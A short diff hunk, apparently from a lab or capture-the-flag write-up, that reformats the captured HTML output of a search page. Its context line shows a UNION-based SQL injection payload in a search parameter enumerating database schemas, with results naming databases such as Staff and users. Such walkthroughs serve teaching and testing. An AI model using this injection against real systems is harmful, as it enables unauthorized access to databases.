@@ -43,7 +43,7 @@ search=killer' UNION SELECT SCHEMA_NAME,2,3,4,5,6 FROM INFORMATION_SCHEMA.SCHEMA
 ```
 ```
 <h3>Search results </h3> 
-ID: information_schema<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: Staff<br/>Name: 2
-3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email:
+ID: information_schema<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: Staff<br/>Name: 2 3
+<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email:
 6<br/>
 ```
